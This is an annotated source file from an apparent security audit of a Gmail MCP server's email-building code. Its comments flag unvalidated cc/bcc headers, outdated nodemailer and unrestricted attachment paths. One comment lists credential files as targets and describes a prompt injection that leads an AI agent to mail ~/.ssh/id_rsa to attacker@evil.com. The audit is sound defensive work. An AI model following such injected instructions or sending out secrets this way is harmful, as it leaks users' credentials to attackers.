// =============================================================================
// ANNOTATED SOURCE: src/utl.ts — Email Message Construction
// Security Audit — GongRzhe/Gmail-MCP-Server v1.1.11
// Date: 2026-02-22
//
// This file handles email construction for send_email and draft_email tools.
// Annotations marked with [AUDIT] prefix. Finding IDs reference vulnerability-report.md.
// =============================================================================

import fs from 'fs';
import path from 'path';
import { lookup as mimeLookup } from 'mime-types';
import nodemailer from 'nodemailer';
// [AUDIT][F10] HIGH — II: nodemailer@^7.0.3 is affected by GHSA-mm7p-fcc7-pg87
// (email sent to unintended domain via interpretation conflict) and GHSA-rcmh-qjqh-p98v
// (DoS via recursive addressparser). Fix: update to nodemailer >7.0.10.

function encodeEmailHeader(text: string): string {
    if (/[^\x00-\x7F]/.test(text)) {
        return '=?UTF-8?B?' + Buffer.from(text).toString('base64') + '?=';
    }
    return text;
}

export const validateEmail = (email: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
};
// [AUDIT][F15] MEDIUM — II: This regex is overly permissive. It accepts:
//   - user@evil.com. (trailing dot)
//   - user@1.1 (IP-like domains)
//   - Any string matching X@Y.Z where X, Y, Z contain no whitespace or @
// More critically, this function is ONLY called for the 'to' field.
// The 'cc', 'bcc', and 'forward' (in filters) fields are NEVER validated.

export function createEmailMessage(validatedArgs: any): string {
    const encodedSubject = encodeEmailHeader(validatedArgs.subject);
    let mimeType = validatedArgs.mimeType || 'text/plain';

    if (validatedArgs.htmlBody && mimeType !== 'text/plain') {
        mimeType = 'multipart/alternative';
    }

    const boundary = `----=_NextPart_${Math.random().toString(36).substring(2)}`;

    // Validate email addresses
    (validatedArgs.to as string[]).forEach(email => {
        if (!validateEmail(email)) {
            throw new Error(`Recipient email address is invalid: ${email}`);
        }
    });
    // [AUDIT][F15] MEDIUM — II: Only 'to' is validated. See below — cc and bcc bypass
    // validateEmail() entirely and are interpolated directly into headers.

    const emailParts = [
        'From: me',
        `To: ${validatedArgs.to.join(', ')}`,
        validatedArgs.cc ? `Cc: ${validatedArgs.cc.join(', ')}` : '',
        // [AUDIT][F15] MEDIUM — II: CC values interpolated directly into email header
        // with NO validation. Accepts arbitrary strings. Potential for header injection
        // if values contain CRLF sequences (though Zod string type may limit this).
        validatedArgs.bcc ? `Bcc: ${validatedArgs.bcc.join(', ')}` : '',
        // [AUDIT][F15] MEDIUM — II: Same issue as CC — no validation on BCC.
        `Subject: ${encodedSubject}`,
        validatedArgs.inReplyTo ? `In-Reply-To: ${validatedArgs.inReplyTo}` : '',
        validatedArgs.inReplyTo ? `References: ${validatedArgs.inReplyTo}` : '',
        'MIME-Version: 1.0',
    ].filter(Boolean);

    if (mimeType === 'multipart/alternative') {
        emailParts.push(`Content-Type: multipart/alternative; boundary="${boundary}"`);
        emailParts.push('');

        emailParts.push(`--${boundary}`);
        emailParts.push('Content-Type: text/plain; charset=UTF-8');
        emailParts.push('Content-Transfer-Encoding: 7bit');
        emailParts.push('');
        emailParts.push(validatedArgs.body);
        emailParts.push('');

        emailParts.push(`--${boundary}`);
        emailParts.push('Content-Type: text/html; charset=UTF-8');
        emailParts.push('Content-Transfer-Encoding: 7bit');
        emailParts.push('');
        emailParts.push(validatedArgs.htmlBody || validatedArgs.body);
        emailParts.push('');

        emailParts.push(`--${boundary}--`);
    } else if (mimeType === 'text/html') {
        emailParts.push('Content-Type: text/html; charset=UTF-8');
        emailParts.push('Content-Transfer-Encoding: 7bit');
        emailParts.push('');
        emailParts.push(validatedArgs.htmlBody || validatedArgs.body);
    } else {
        emailParts.push('Content-Type: text/plain; charset=UTF-8');
        emailParts.push('Content-Transfer-Encoding: 7bit');
        emailParts.push('');
        emailParts.push(validatedArgs.body);
    }

    return emailParts.join('\r\n');
}


export async function createEmailWithNodemailer(validatedArgs: any): Promise<string> {
    // Validate email addresses
    (validatedArgs.to as string[]).forEach(email => {
        if (!validateEmail(email)) {
            throw new Error(`Recipient email address is invalid: ${email}`);
        }
    });
    // [AUDIT][F15] MEDIUM — Same pattern: only 'to' validated, cc/bcc not validated.

    const transporter = nodemailer.createTransport({
        streamTransport: true,
        newline: 'unix',
        buffer: true
    });

    const attachments = [];
    for (const filePath of validatedArgs.attachments) {
        if (!fs.existsSync(filePath)) {
            throw new Error(`File does not exist: ${filePath}`);
        }
        // [AUDIT][F04] HIGH — II: The ONLY validation on attachment file paths is
        // fs.existsSync(). There is NO path restriction — any readable file on the
        // filesystem can be attached and sent via email. Exploitable targets include:
        //   ~/.gmail-mcp/credentials.json (OAuth refresh token)
        //   ~/.ssh/id_rsa (SSH private key)
        //   ~/.aws/credentials (AWS keys)
        //   /proc/self/environ (environment variables)
        //   /etc/passwd (system user list)
        //
        // Attack chain: Prompt injection in email body instructs LLM to call send_email
        // with attachments: ["/home/user/.ssh/id_rsa"] and to: ["attacker@evil.com"]

        const fileName = path.basename(filePath);
        // Note: path.basename is used for the display filename in the email,
        // but the FULL path is passed to Nodemailer for reading the file content.

        attachments.push({
            filename: fileName,
            path: filePath
            // [AUDIT][F04] HIGH — II: Full arbitrary file path passed to Nodemailer.
            // Nodemailer reads this file and encodes it into the MIME message.
            // This is the exfiltration point — file content leaves the system via email.
        });
    }

    const mailOptions = {
        from: 'me',
        to: validatedArgs.to.join(', '),
        cc: validatedArgs.cc?.join(', '),
        bcc: validatedArgs.bcc?.join(', '),
        subject: validatedArgs.subject,
        text: validatedArgs.body,
        html: validatedArgs.htmlBody,
        attachments: attachments,
        inReplyTo: validatedArgs.inReplyTo,
        references: validatedArgs.inReplyTo
    };

    const info = await transporter.sendMail(mailOptions);
    const rawMessage = info.message.toString();

    return rawMessage;
}
